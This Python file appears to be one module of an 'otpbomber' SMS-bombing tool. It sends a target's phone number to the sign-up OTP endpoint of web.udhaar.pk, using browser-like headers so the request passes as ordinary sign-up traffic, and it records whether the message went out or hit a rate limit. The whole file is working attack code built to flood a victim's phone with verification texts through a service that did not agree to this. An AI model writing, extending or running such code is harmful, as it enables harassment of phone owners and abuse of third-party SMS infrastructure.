from otpbomber.core import *
from otpbomber.localuseragent import *

async def udhaar(phone, client, out):
    name = "udhaar"
    domain = "udhaar"
    frequent_rate_limit=False
    
    headers = {
        'origin': 'https://web.udhaar.pk',
        'referer': 'https://web.udhaar.pk/SignUp',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }

    json_data = {
        'version': 'multi-business',
        'referer': None,
        'phone_number': f'03{phone[-9:]}',
    }

    response = await client.post('https://web.udhaar.pk/udhaar/dukaan/create/sendotp/',  headers=headers, json=json_data)
    print(response.json())
    try:
        data=response.json()
        if data["sent"] == True:
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        if data["success"] == False and data["message"] == "Please wait a moment to try again":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": True,"sent": False, "error": False})
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None